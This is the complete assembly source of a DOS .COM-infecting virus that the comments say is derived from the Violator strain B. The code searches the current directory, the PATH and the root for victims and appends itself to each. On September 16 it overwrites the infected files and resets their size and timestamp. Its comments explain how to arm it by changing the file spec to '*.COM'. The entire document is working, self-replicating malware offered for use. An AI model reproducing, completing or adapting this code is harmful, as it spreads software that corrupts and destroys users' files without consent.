; this code ataches to all .com files in the current dir then the path then 
; the root dir then on 9-16 it does things to the same files. 
; it set's them to 10:00am 9-16-91 and set's the file size to 
; how many years since that date basically your harmless little 
; iritating virus mostly getting at the little utilites in the path.. 
; and eventually command.com based originally on violator strain b 
; ( which is a nasty one formats randomly) it has no name 
; name it what you will...

; change fspec_ to '*.COM' to make it work.. set in test mode right now..

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H                         ; Set ORG to 100H plus our own

VCODE:  JMP     virus

        NOP
        NOP
        NOP
        NOP                                     ;15 NOP's to place JMP Header
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP

v_start equ     $

virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat
        CLD
        NOP
        MOV     SI,DX                   ; setup the data to write out
        ADD     SI,first_3
        MOV     CX,4
        MOV     DI,OFFSET 100H
        REPZ    MOVSB
        MOV     SI,DX

        PUSH    ES
        MOV     AH,2FH                  ; get DTA
        INT     21H                     ; save old dta
        NOP
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES
        POP     ES
        MOV     DX,dta                  ; DX = our DTA
        ADD     DX,SI                   
        MOV     AH,1AH                  ;set DTA address
        INT     21H                     
        NOP
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        XOR     DI,DI                   ; zero DI 

        MOV     AH,2AH                  ;Get date info
        INT     21h                     ;Call DOS
        CMP     DH,9                    ;Check to see if it is the right month
        NOP
        JE      day_check               ;If equal, check day
        JMP     find_Path               ;if not, go on with infection

day_check:
        CMP     DL,16                   ;Check to see if today is the day
        JE      Set_Delete              ;If yes, then check day of week
        JMP     find_Path               ;If not, then go on with infection

Set_Delete:
        SUB     CX,7C7H                 ; figure file size
        MOV     [SI+B_day],CX

        MOV     AL,1
        MOV     [SI+del_f],AL           ; set del flag

find_path:

        POP     SI
        PUSH    SI                      ;clear SI
        ADD     SI,env_str              ; env string in SI
        NOP
        LODSB                           ; load byte into AL
        MOV     CX,OFFSET 8000H
        REPNZ   SCASB                   ; do this 128 or 32768 skip 128?

        MOV     CX,4

check_next_4:                           ; load byte into AL
        LODSB                           ; four times 
        SCASB
;
; The JNZ line specifies that if there is no PATH present, then we will go
; along and infect the ROOT directory on the default drive.
;
        JNZ     find_path               ;If not path, then go to ROOT dir
        LOOP    check_next_4            ;Go back and check for more chars
        POP     SI                      ;Load in PATH again to look for chars
        POP     ES
        MOV     [SI+path_ad],DI
        MOV     DI,SI
        ADD     DI,wrk_spc              ;Put the filename in wrk_spc
        MOV     BX,SI
        ADD     SI,wrk_spc
        MOV     DI,SI
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0
        JNZ     found_subdir
        JMP     all_done

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]
        ADD     DI,wrk_spc              ;DI is the file name to infect! (hehe)

move_subdir:
        LODSB                           ;To tedious work to move into subdir
        CMP     AL,';'                  ;Does it end with a ; charachter?
        JZ      moved_one               ;if yes, then we found a subdir
        CMP     AL,0                    ;is it the end of the path?
        JZ      moved_last_one          ;if yes, then we save the PATH
        STOSB                           ;marker into DI for future reference
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;BX is where the virus data is
        POP     DS                      ;Restore DS so that we can do stuph
        MOV     [BX+path_ad],SI         ;Where is the next subdir?
        NOP
        CMP     CH,'\'                  ;Check to see if it ends in \
        JZ      slash_ok                ;If yes, then it's OK
        MOV     AL,'\'                  ;if not, then add one...
        STOSB                           ;store the sucker


slash_ok:
        MOV     [BX+nam_ptr],DI         ;Move the filename into workspace
        MOV     SI,BX                   ;Restore the original SI value
        ADD     SI,f_spec               ;Point to COM file victim
        MOV     CX,6
        REPZ    MOVSB                   ;Move victim into workspace
        NOP
        MOV     SI,BX
        MOV     AH,4EH                  ; find first again?
        MOV     DX,wrk_spc              ; file name
        ADD     DX,SI                   ; DX is ... THE VICTIM!!!
        MOV     CX,3                    ; Attributes of Read Only or Hidden OK
        INT     21H
        NOP
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH                  ; find next file
        INT     21H

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1EH                  ;Mask to remove all but seconds
        CMP     AL,1EH                  ;60 seconds
        NOP
        JZ      check_day
        JMP     go_on
check_day:
        XOR     AL,AL
        CMP     AL,[SI+del_f]
        JE      find_next
go_on:
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;to big 64k?
        JA      find_next                      ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH      ;too small 10bytes?
        JB      find_next                      ;Then go find another one
        NOP
        MOV     DI,[SI+nam_ptr]
        PUSH    SI
        ADD     SI,dta_nam

more_chars:

        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars
        POP     SI
        MOV     AX,OFFSET 4300H         ;get file attr
        MOV     DX,wrk_spc
        ADD     DX,SI
        INT     21H
        NOP
        MOV     [SI+old_attr],CX        ; save file attr
        MOV     AX,OFFSET 4301H         ; set file attr
        AND     CX,OFFSET 0FFFEH        ; set file attr to  11111110B
;        MOV     DX,wrk_spc
;        ADD     DX,SI
        INT     21H

check_delete:
        XOR     AL,AL
        CMP     AL,[SI+del_f]
        JE      open

create:
        MOV     AX,OFFSET 3C00H         ;create nornal file
;        MOV     DX,wrk_spc              ;
;        ADD     DX,SI                   ;
        INT     21H
        NOP

        MOV     BX,AX

        MOV     CX,[SI+b_day]
        MOV     AH,40H
        INT     21H
        NOP

        MOV     AX,OFFSET 5701H         ;Set Date Time
        MOV     CX,05000H               ;Time 10:00am

        MOV     DX,01730H               ;Date 9-16-91
        INT     21H
        NOP

        JMP     Fix_attr

open:
        MOV     AX,OFFSET 3D02H         ; open read/write
;        MOV     DX,wrk_spc              ;
;        ADD     DX,SI                   ;
        INT     21H
        JNB     Get_td
        JMP     fix_attr

Get_td:
        MOV     BX,AX                   ; AX is the file handle
        MOV     AX,OFFSET 5700H         ;get date time
        INT     21H
        NOP
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
;        MOV     AH,2CH                 ; get system time?
;        INT     21H
;        AND     DH,7

        XOR     AL,AL                   ; should i infect or just get out
        CMP     AL,[SI+del_f]
        JE      infect
        jmp     fix_attr


infect:

        MOV     AH,3FH                  ; read file
        MOV     CX,3                    ; three chars
        MOV     DX,first_3              ; put those three on first_3
        ADD     DX,SI
        INT     21H                     ;Save first 3 bytes into the data area
        NOP

        JB      fix_time_stamp          ; can't read go here
        CMP     AX,3                    ;is ax 3?
        JNZ     fix_time_stamp          ;if three wern't read go here
        MOV     AX,OFFSET 4202H         ; move file pointer offset from end
        XOR     CX,CX                   ; 0 chars
        XOR     DX,DX                   ; data buffer
        INT     21H                     ; read file
        JB      fix_time_stamp          ; can't read go here
        MOV     CX,AX                   ; mov the error code into CX
        SUB     AX,3                    ; subtract ax from 3?
        MOV     [SI+jmp_dsp],AX         ; 0
        ADD     CX,OFFSET c_len_y       ; 100H more that codelen
        MOV     DI,SI
        SUB     DI,OFFSET c_len_x       ; two less that codelen

        MOV     [DI],CX
        MOV     AH,40H                  ;Write file
        MOV     CX,virlen

        MOV     DX,SI
        SUB     DX,OFFSET codelen
        INT     21H                     ;Write file
        JB      fix_time_stamp
        CMP     AX,OFFSET virlen
        NOP
        JNZ     fix_time_stamp
        MOV     AX,OFFSET 4200H         ;move file poniter to begin
        XOR     CX,CX
        XOR     DX,DX
        INT     21H                     ;Write file
        JB      fix_time_stamp
        MOV     AH,40H                  ;Write file
        MOV     CX,3
        MOV     DX,SI
        ADD     DX,jmp_op               ; write jmp to us at beginging
        INT     21H                     ;Write file

fix_time_stamp:
        MOV     DX,[SI+ol_date]
        MOV     CX,[SI+old_tim]
        AND     CX,OFFSET 0FFE0H        ; mask hours and mins?
        OR      CX,1EH                  ; 60 seconds
        MOV     AX,OFFSET 5701H         ;set date time
        INT     21H
        MOV     AH,3EH                  ; close file
        INT     21H

fix_attr:
        MOV     AX,OFFSET 4301H         ;set file attr
        MOV     CX,[SI+old_attr]
        MOV     DX,wrk_spc
        ADD     DX,SI
        INT     21H

all_done:

        PUSH    DS
        MOV     AH,1AH                  ; set DTA address
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H
        POP     DS

quit:
        POP     CX
        XOR     AX,AX                   ;XOR values so that we will give the
        XOR     BX,BX                   ;poor sucker a hard time trying to
        XOR     DX,DX                   ;reassemble the source code if he
        XOR     SI,SI                   ;decides to dissassemble us.
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH                  ;Return back to the beginning
                                        ;of the program

vir_dat         EQU     $

olddta_         DW      0
olddts_         DW      0
oldtim_         DW      0
oldate_         DW      0
oldattr_        DW      0
first3_         EQU     $
                NOP
                INT     20H
                NOP
jmpop_          DB      0E9H
jmpdsp_         DW      0
fspec_          DB      '*.$@$',0        ; change to *.COM to make it work
pathad_         DW      0
namptr_         DW      0
envstr_         DB      'PATH='
wrkspc_         DB      40h dup (0)
dta_            DB      16h dup (0)
dtatim_         DW      0,0
dtalen_         DW      0,0
dtanam_         DB      0Dh dup (0)
delf_           DB      0
BDay_           DB      0
lst_byt         EQU     $
virlen  =       lst_byt - v_start
codelen =       vir_dat - v_start
c_len_x =       vir_dat - v_start - 2
c_len_y =       vir_dat - v_start + 100H
old_dta =       olddta_ - vir_dat
old_dts =       olddts_ - vir_dat
old_tim =       oldtim_ - vir_dat
ol_date =       oldate_ - vir_dat
old_attr =      oldattr_ - vir_dat
first_3 =       first3_ - vir_dat
jmp_op  =       jmpop_  - vir_dat
jmp_dsp =       jmpdsp_ - vir_dat
f_spec  =       fspec_  - vir_dat
path_ad =       pathad_ - vir_dat
nam_ptr =       namptr_ - vir_dat
env_str =       envstr_ - vir_dat
wrk_spc =       wrkspc_ - vir_dat
dta     =       dta_    - vir_dat
dta_tim =       dtatim_ - vir_dat
dta_len =       dtalen_ - vir_dat
dta_nam =       dtanam_ - vir_dat
del_f   =       delf_   - vir_dat
B_Day   =       bday_   - vir_dat
        CODE    ENDS
END     VCODE


